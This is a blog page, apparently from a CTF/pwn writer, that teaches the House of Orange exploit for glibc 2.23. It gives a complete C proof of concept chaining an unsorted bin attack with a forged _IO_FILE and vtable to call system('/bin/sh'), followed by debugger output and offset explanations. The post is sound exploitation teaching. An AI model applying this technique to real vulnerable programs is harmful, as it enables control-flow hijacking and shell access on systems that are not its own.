@@ -1,0 +1,596 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    index | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="House of Orange glibc-2.23什么是 House of Orange？House of Orange 是针对于 libc-2.23 的一种攻击方法，是将 libc_heap 攻击和 __IO_FILE 攻击组合起来的利用手段  House of Orange Poc12345678910111213141516171819202122232425262728293031323">
+<meta property="og:type" content="article">
+<meta property="og:title" content="index">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseofOrangeglibc-2.23/index/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="House of Orange glibc-2.23什么是 House of Orange？House of Orange 是针对于 libc-2.23 的一种攻击方法，是将 libc_heap 攻击和 __IO_FILE 攻击组合起来的利用手段  House of Orange Poc12345678910111213141516171819202122232425262728293031323">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/pa4x8FNuJvHu-FX9/1774933401205-29f3e97b-3933-4aca-bbeb-593e5b6f47e7-714667.png">
+<meta property="article:published_time" content="2026-04-28T10:25:57.248Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.399Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/pa4x8FNuJvHu-FX9/1774933401205-29f3e97b-3933-4aca-bbeb-593e5b6f47e7-714667.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="index">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">index</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Orange-glibc-2-23"><span class="toc-number">1.</span> <span class="toc-text">House of Orange glibc-2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-House-of-Orange%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 House of Orange？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Orange-Poc"><span class="toc-number">1.1.1.</span> <span class="toc-text">House of Orange Poc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%8B%E8%BF%99%E4%B8%80%E6%AE%B5-POC-%E5%90%A7%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解释一下这一段 POC 吧：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E4%B8%8E%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">内存布局与地址泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-Chunk-%E5%85%83%E6%95%B0%E6%8D%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">伪造 Chunk 元数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsorted-Bin-Attack-%E5%8A%AB%E6%8C%81%E9%93%BE%E8%A1%A8%E5%A4%B4"><span class="toc-number">1.2.3.</span> <span class="toc-text">Unsorted Bin Attack 劫持链表头</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FSOP-%E7%BB%93%E6%9E%84%E4%BD%93%E9%87%8D%E5%8F%A0"><span class="toc-number">1.2.4.</span> <span class="toc-text">FSOP 结构体重叠</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%AF%B9-main-arena-%E5%92%8C-bins-%E7%9A%84%E5%81%8F%E7%A7%BB%E5%86%8D%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">这里对 main_arena 和 bins 的偏移再进行解释：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#main-arena%EF%BC%9A%E5%88%86%E9%85%8D%E5%8C%BA%E7%BB%93%E6%9E%84-malloc-state"><span class="toc-number">1.2.4.1.1.</span> <span class="toc-text">main_arena：分配区结构 (malloc_state)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-IO-FILE-%E7%BB%95%E8%BF%87%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%8A%AB%E6%8C%81%E6%89%A7%E8%A1%8C%E6%B5%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">伪造 _IO_FILE 绕过检查与劫持执行流</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%88%86-The-Trigger"><span class="toc-number">1.2.6.</span> <span class="toc-text">引爆 (The Trigger)</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/HouseofOrangeglibc-2.23/index" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:57.248Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="House-of-Orange-glibc-2-23"><a href="#House-of-Orange-glibc-2-23" class="headerlink" title="House of Orange glibc-2.23"></a>House of Orange glibc-2.23</h1><h3 id="什么是-House-of-Orange？"><a href="#什么是-House-of-Orange？" class="headerlink" title="什么是 House of Orange？"></a>什么是 House of Orange？</h3><p>House of Orange 是针对于 libc-2.23 的一种攻击方法，是将 libc_heap 攻击和 __IO_FILE 攻击组合起来的利用手段</p>
+<p><img src="/HFTTC.github.io/./img/pa4x8FNuJvHu-FX9/1774933401205-29f3e97b-3933-4aca-bbeb-593e5b6f47e7-714667.png" alt="1774933401205-29f3e97b-3933-4aca-bbeb-593e5b6f47e7.png"></p>
+<h4 id="House-of-Orange-Poc"><a href="#House-of-Orange-Poc" class="headerlink" title="House of Orange Poc"></a>House of Orange Poc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For glibc-2.23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;my_malloc.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">this</span>, *<span class="title">top_chunk</span>;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr, main_arena_addr;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);    <span class="comment">// 关闭输出缓冲流，防止调用 malloc 函数</span></span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Prevent the merger</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    this = mem2chunk(ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 泄露 main_arena 地址 (Unsorted Bin 的 fd 指向 main_arena + 88)</span></span><br><span class="line">    main_arena_addr = (<span class="type">size_t</span>)this-&gt;fd - <span class="number">88</span>;</span><br><span class="line">    LOGV(main_arena_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 伪造 chunk 的 size，构造后续 FSOP 链</span></span><br><span class="line">    this-&gt;size = <span class="number">0x61</span>; <span class="comment">// 对应 _chain 偏移</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;this-&gt;prev_size, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unsorted bin attack</span></span><br><span class="line">    <span class="comment">// 目标是将 _IO_list_all 指针覆盖为 main_arena + 0x58 (unsorted bin 链表头)</span></span><br><span class="line">    this-&gt;bk = (<span class="keyword">struct</span> malloc_chunk *)(main_arena_addr + <span class="number">0xa00</span> - <span class="number">0x10</span>); <span class="comment">// __GI__IO_list_all</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 伪造 _IO_FILE 结构体字段</span></span><br><span class="line">    this-&gt;fd_nextsize = (<span class="keyword">struct</span> malloc_chunk *)<span class="number">2</span>; <span class="comment">// _IO_write_base</span></span><br><span class="line">    this-&gt;bk_nextsize = (<span class="keyword">struct</span> malloc_chunk *)<span class="number">3</span>; <span class="comment">// _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 劫持 vtable 指针</span></span><br><span class="line">    *(<span class="type">size_t</span> **)((<span class="type">char</span> *)this + <span class="number">0xd8</span>) = buf; <span class="comment">// vtable 偏移</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 伪造 vtable 中的 __overflow 函数指针为 system</span></span><br><span class="line">    buf[<span class="number">3</span>] = (<span class="type">size_t</span>)system;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 触发 Unsorted Bin Attack，并将伪造的 chunk 链入 _IO_list_all</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解释一下这一段-POC-吧："><a href="#解释一下这一段-POC-吧：" class="headerlink" title="解释一下这一段 POC 吧："></a>解释一下这一段 POC 吧：</h3><h4 id="内存布局与地址泄露"><a href="#内存布局与地址泄露" class="headerlink" title="内存布局与地址泄露"></a>内存布局与地址泄露</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// 防止与 top_chunk 合并</span></span><br><span class="line">this = mem2chunk(ptr);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">main_arena_addr = (<span class="type">size_t</span>)this-&gt;fd - <span class="number">88</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>操作</strong>：申请一个较大的 chunk（0x100），它在被 free 后会进入 <strong>Unsorted Bin</strong>（而不是 Fastbin）。紧接着申请 0x18 大小的 chunk，防止 0x100 被释放后直接与顶部的 Top Chunk 合并。</li>
+<li><strong>泄露原理</strong>：当 Unsorted Bin 中只有一个空闲 chunk 时，它的 fd 和 bk 指针都会指向 Unsorted Bin 的链表头。而这个链表头位于 libc 内部的 main_arena 结构体中，偏移量正好是 88（0x58）。因此，通过读取 fd 减去 88，就能精准计算出 main_arena 的基地址。</li>
+</ul>
+<h4 id="伪造-Chunk-元数据"><a href="#伪造-Chunk-元数据" class="headerlink" title="伪造 Chunk 元数据"></a>伪造 Chunk 元数据</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this-&gt;size = <span class="number">0x61</span>; <span class="comment">// 对应 _chain 偏移</span></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;this-&gt;prev_size, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>size &#x3D; 0x61：这是整个攻击链中最巧妙的一环。将原本大小为 0x100 的 chunk 大小改写为 0x61（即 0x60 大小 + PREV_INUSE 标志位）。这是为了在后续分配时，让 malloc 将这个 chunk 整理（sort）进大小为 0x60 的 <strong>Small Bin</strong> 中。</li>
+<li>memcpy：将字符串 “&#x2F;bin&#x2F;sh” 写在 chunk 的最开头。在后续被当作 __IO_FILE 结构体时，这里对应文件流的起始部分。<font style="color:#DF2A3F;">由于虚函数调用时会将文件结构体的指针作为第一个参数传递</font>，这相当于把 “&#x2F;bin&#x2F;sh” 作为参数传给了 system。</li>
+</ul>
+<h4 id="Unsorted-Bin-Attack-劫持链表头"><a href="#Unsorted-Bin-Attack-劫持链表头" class="headerlink" title="Unsorted Bin Attack 劫持链表头"></a>Unsorted Bin Attack 劫持链表头</h4><p>劫持 UnSortedbin 的 bk 值，从而触发 UnSortedbin Attack：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this-&gt;bk = (<span class="keyword">struct</span> malloc_chunk *)(main_arena_addr + <span class="number">0xa00</span> - <span class="number">0x10</span>); <span class="comment">// __GI__IO_list_all</span></span><br></pre></td></tr></table></figure>
+
+<p>自己可以去看一下程序中 main_arena 和 _IO_list_all 的距离：距离为 0xa00&#x3D;&#x3D;&gt;</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;(main_arena)                                                                            </span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">struct</span> malloc_state *) <span class="number">0x7ffff7e15ac0</span> &lt;main_arena&gt;                                           </span><br><span class="line">pwndbg&gt; p &amp;( __GI__IO_list_all)                                                                    </span><br><span class="line">$<span class="number">2</span> = (<span class="keyword">struct</span> _IO_FILE_plus **) <span class="number">0x7ffff7e164c0</span> &lt;_IO_list_all&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>0x64c0 - 0x5ac0 &#x3D; 0xa00</p>
+<ul>
+<li><strong>目标</strong>：_IO_list_all 是 libc 中管理所有文件流（如 stdin, stdout, stderr）的单向链表头指针。</li>
+<li><strong>原理</strong>：Unsorted Bin Attack 的核心在于利用 malloc 过程中的 unlink 操作：bck-&gt;fd &#x3D; fwd</li>
+<li><strong>结果</strong>：这段代码将伪造 chunk 的 bk 指向了<code>_IO_list_all - 0x10</code>。当下一次触发 malloc 时，libc 会将这个 chunk 从 Unsorted Bin 卸下，执行<code> bck -&gt; fd = fwd</code>，这会导致 _IO_list_all 的值被覆盖为 <code>main_arena + 0x58</code>&#x3D; main_arena_addr（即 Unsorted Bin 的链表头）。</li>
+</ul>
+<h4 id="FSOP-结构体重叠"><a href="#FSOP-结构体重叠" class="headerlink" title="FSOP 结构体重叠"></a>FSOP 结构体重叠</h4><p>这一步是系统自动发生的，也是代码精妙所在：</p>
+<ol>
+<li>现在 <code>_IO_list_all</code> 指向了 <code>main_arena + 0x58</code>。libc 把 <code>main_arena + 0x58</code> 当作了一个 <code>_IO_FILE</code> 结构体。</li>
+<li>libc 如果遇到严重错误（比如后面的 malloc 发现堆被破坏）或者程序正常退出，会调用 <code>_IO_flush_all_lockp</code> 来刷新所有的文件流。</li>
+<li>系统会顺着 <code>_IO_list_all</code> 往下找。它通过读取 <code>_IO_FILE</code> 结构体中偏移为 <code>0x68</code> 的 <code>_chain</code> 字段来寻找下一个文件流。</li>
+<li><strong>巧合发生</strong>：<code>(main_arena + 0x58) + 0x68 = main_arena + 0xc0</code>。而 <code>main_arena + 0xc0</code> 恰好是 <code>smallbins[4]</code> 的地址，也就是专门存放大小为 <code>0x60</code> 的 chunk 的双向链表头！</li>
+<li>因为我们前面把 chunk 的 <code>size</code> 改成了 <code>0x61</code>，在下一次 <code>malloc</code> 遍历 Unsorted Bin 时，它会被系统主动放入这个 <code>smallbins[4]</code> 中。</li>
+<li><strong>结论</strong>：libc 顺着 _chain 往下找，刚好找到了我们完全可控的 this-&gt;chunk，并把它当作第二个 <code>_IO_FILE</code> 结构体进行处理。</li>
+</ol>
+<hr>
+<h5 id="这里对-main-arena-和-bins-的偏移再进行解释："><a href="#这里对-main-arena-和-bins-的偏移再进行解释：" class="headerlink" title="这里对 main_arena 和 bins 的偏移再进行解释："></a><font style="color:#07787E;">这里对 main_arena 和 bins 的偏移再进行解释：</font></h5><h6 id="main-arena：分配区结构-malloc-state"><a href="#main-arena：分配区结构-malloc-state" class="headerlink" title="main_arena：分配区结构 (malloc_state)"></a>main_arena：分配区结构 (malloc_state)</h6><p>在 glibc 源码中，分配区是由 <code>struct malloc_state</code> 定义的。对于主线程，系统会创建一个全局静态变量 main_arena 来管理主线程的堆。</p>
+<p>glibc 规定了 128 个常规 Bin。因为是双向链表，每个 Bin 需要两个指针：一个当 fd（前向指针），一个当 bk（后向指针）。其中 bin 0 不使用，所以数组大小是 128 × 2 − 2 &#x3D; 254 个指针元素。</p>
+<p><font style="color:#DF2A3F;">这 126 个实际使用的 Bin 被严格划分为三个梯队：</font></p>
+<ul>
+<li><strong>Bin 1（1 个）</strong>：Unsorted Bin。刚刚被释放的大块，非 fastbin 大小会先扔到这里，相当于一个缓存区。</li>
+<li><strong>Bin 2 ~ Bin 63（62 个）</strong>：Small Bins。管理固定大小的 chunk（如 0x20, 0x30, …, 0x3F0 等）。每个 bin 只装一种大小的 chunk。</li>
+<li><strong>Bin 64 ~ Bin 126（63 个）</strong>：Large Bins。管理范围大小的 chunk（例如 0x400 ~ 0x430 放一个 bin 里）。按大小排序。</li>
+</ul>
+<p>在 64 位 glibc-2.23 中，bins 数组位于 main_arena + 0x68。数组里的元素依次交替为 fd 和 bk。</p>
+<p>我们来做个推演：</p>
+<ul>
+<li><code>bins[0]</code> (offset <code>0x68</code>): Unsorted Bin 的 <code>fd</code> (指向链表中第一个 chunk)</li>
+<li><code>bins[1]</code> (offset <code>0x70</code>): Unsorted Bin 的 <code>bk</code> (指向链表中最后一个 chunk)</li>
+<li><code>bins[2]</code> (offset <code>0x78</code>): Small Bin (0x20 大小) 的 <code>fd</code></li>
+<li><code>bins[3]</code> (offset <code>0x80</code>): Small Bin (0x20 大小) 的 <code>bk</code></li>
+<li><code>bins[4]</code> (offset <code>0x88</code>): Small Bin (0x30 大小) 的 <code>fd</code></li>
+<li><code>bins[5]</code> (offset <code>0x90</code>): Small Bin (0x30 大小) 的 <code>bk</code></li>
+</ul>
+<p>依次类推，规律是：对于目标大小 <code>size</code>（包含 chunk header），它的双向链表表头在数组中的索引可以通过公式计算。 对于 <code>0x60</code> 大小的 Small Bin：</p>
+<ul>
+<li>它是第 5 个 Small Bin（0x20, 0x30, 0x40, 0x50, <strong>0x60</strong>）。</li>
+<li>它的 <code>fd</code> 就是 <code>bins[10]</code>，地址 &#x3D; <code>0x68 + 10 * 8 = 0xb8</code>。</li>
+<li><strong><font style="color:#DF2A3F;">它的 </font></strong><code><strong><font style="color:#DF2A3F;">bk</font></strong></code><strong><font style="color:#DF2A3F;"> 就是 </font></strong><code><strong><font style="color:#DF2A3F;">bins[11]</font></strong></code><strong><font style="color:#DF2A3F;">，地址 &#x3D; </font></strong><code><strong><font style="color:#DF2A3F;">0x68 + 11 * 8 = 0xc0</font></strong></code><strong><font style="color:#DF2A3F;">。</font></strong></li>
+</ul>
+<p><font style="color:#07787E;">这完美印证了我们前面讨论的 House of Orange </font><code><font style="color:#07787E;">main_arena + 0xc0</font></code><font style="color:#07787E;"> 确确实实就是用来存放 </font><code><font style="color:#07787E;">0x60</font></code><font style="color:#07787E;"> 大小 chunk 链表尾部指针的地方。</font></p>
+<hr>
